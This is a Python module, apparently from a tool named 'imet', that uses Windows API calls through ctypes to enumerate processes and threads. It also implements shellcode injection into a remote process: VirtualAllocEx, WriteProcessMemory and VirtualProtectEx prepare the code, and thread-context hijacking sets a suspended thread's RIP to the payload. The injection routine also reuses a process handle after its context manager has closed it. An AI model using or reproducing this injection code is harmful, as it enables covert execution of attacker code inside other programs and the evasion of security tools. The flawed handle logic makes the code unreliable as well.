from imet.server.api import winapi
import ctypes
from ctypes import wintypes
import contextlib
from typing import Generator


class IMETException(Exception):
    def __init__(self, message):
        super().__init__(message)


@contextlib.contextmanager
def open_process(pid: int) -> Generator[int, None, None]:
    """
    Use OpenProcess to retrieve a handle to a process. Handle is automatically
    closed when exiting the context.
    """
    handle = winapi.OpenProcess(
        winapi.PROCESS_ALL_ACCESS,
        False,
        wintypes.DWORD(pid)
    )
    if not handle:
        raise IMETException(f"OpenProcess failed to retrieve a handle for pid {pid}")
    try:
        yield int(handle)
    finally:
        winapi.CloseHandle(handle)


def get_process_name(handle: int) -> str:
    """
    Use EnumProcessModules and GetModuleBaseNameA and return the name of the process.
    """
    hmodule = wintypes.HMODULE()
    cb = wintypes.DWORD()

    winapi.EnumProcessModules(
        handle,
        ctypes.byref(hmodule),
        ctypes.sizeof(hmodule),
        ctypes.byref(cb)
    )

    process_name = ctypes.create_string_buffer(winapi.MAX_PATH)

    winapi.GetModuleBaseNameA(
        handle,
        hmodule,
        process_name,
        winapi.MAX_PATH
    )

    return process_name.value.decode("utf-8")


def enum_processes() -> list[int]:
    """
    Use EnumProcess and return a list of PIDs.
    """
    array_size = 1024
    pids = (wintypes.DWORD * array_size)()
    bytes_returned = wintypes.DWORD()

    winapi.EnumProcesses(
        pids, 
        ctypes.sizeof(pids), 
        ctypes.byref(bytes_returned)
    )

    num_processes = bytes_returned.value // ctypes.sizeof(wintypes.DWORD)
    return list(pids[:num_processes])


@contextlib.contextmanager
def create_thread(thread_id: int = 0, suspended: bool = False) -> Generator[int, None, None]:
    @winapi.LPTHREAD_START_ROUTINE
    def thread_func(_lpParam):
        return 0
    
    thread_id = wintypes.DWORD(thread_id)

    hThread = winapi.CreateThread(
        None,                 
        None,                    
        thread_func,           
        None,                   
        winapi.CREATE_SUSPENDED if suspended else 0,                    
        ctypes.byref(thread_id)
    )

    try:
        yield int(thread_id.value)
    finally:
        winapi.CloseHandle(hThread)


def resume_thread(thread_id: int):
    return winapi.ResumeThread(thread_id) == -1


def get_remote_thread_handle(process_id: int) -> tuple[int, int]:
    thread_entry = winapi.THREADENTRY32()
    thread_entry.dwSize = ctypes.sizeof(winapi.THREADENTRY32)
    snapshot = winapi.CreateToolhelp32Snapshot(winapi.TH32CS_SNAPTHREAD, 0)
    winapi.Thread32First(snapshot, ctypes.byref(thread_entry))
    while True:
        if thread_entry.th32OwnerProcessID == process_id:
            thread_id = thread_entry.th32ThreadID
            thread_handle = winapi.OpenThread(winapi.THREAD_ALL_ACCESS, False, thread_id)
            if thread_handle is None:
                print("Failed to open thread in process")
            else:
                winapi.CloseHandle(snapshot)
                return thread_id, thread_handle

        if not winapi.Thread32Next(snapshot, ctypes.byref(thread_entry)):
            break
    
    winapi.CloseHandle(snapshot)
    return None, None


def remote_thread_process_inject(process_id: int, shellcode: list):
    process_handle = None
    with open_process(process_id) as handle:
        process_handle = handle

    if process_handle is None:
        print(f"Unable to locate process id {process_id}, please make sure it's running.")
    _, thread_handle = get_remote_thread_handle(process_id)
    shellcode_address = inject_shellcode_to_remote_process(process_handle, shellcode)
    hijack_thread(thread_handle,  shellcode_address)


def hijack_thread(thread_handle, shellcode_address):
    context = winapi._CONTEXT()
    context.ContextFlags = winapi.CONTEXT_ALL
    winapi.SuspendThread(thread_handle)
    winapi.GetThreadContext(thread_handle, ctypes.byref(context))
    context.Rip = ctypes.cast(shellcode_address, wintypes.DWORD64).value
    winapi.SetThreadContext(thread_handle, ctypes.byref(context))
    winapi.ResumeThread(thread_handle)
    winapi.WaitForSingleObject(thread_handle, -1)


def inject_shellcode_to_remote_process(process_handle, shellcode) -> int:
    bytes_written = winapi.SIZE_T(0)
    old_protection = wintypes.DWORD(0)
    shellcode_data = (ctypes.c_char * len(shellcode))(*shellcode)
    shellcode_size = ctypes.sizeof(shellcode_data)
    alloc_address = winapi.VirtualAllocEx(process_handle, None, shellcode_size, winapi.MEM_COMMIT | winapi.MEM_RESERVE, winapi.PAGE_READWRITE)
    winapi.WriteProcessMemory(process_handle, alloc_address, shellcode_data, shellcode_size, ctypes.byref(bytes_written))
    if bytes_written.value != shellcode_size:
        print("[!] WriteProcessMemory wrote incorrect number of bytes.")
    winapi.VirtualProtectEx(process_handle, alloc_address, shellcode_size, winapi.PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection))
    return alloc_address